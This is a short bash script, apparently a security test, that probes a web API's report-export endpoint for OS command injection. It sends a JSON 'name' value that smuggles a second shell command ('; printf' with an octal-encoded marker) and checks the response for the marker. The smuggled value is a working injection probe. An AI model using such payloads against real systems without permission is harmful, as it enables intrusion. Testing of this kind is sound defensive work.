#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
payload=$(python3 - <<'PY'
import json
print(json.dumps({"name":"x; printf '\\106\\101\\123\\124\\101\\120\\111\\137\\103\\115\\104\\137\\064\\062'"}))
PY
)
curl -s -X POST "$TARGET/api/reports/export" -H 'content-type: application/json' -d "$payload" | grep -q 'FASTAPI_CMD_42'
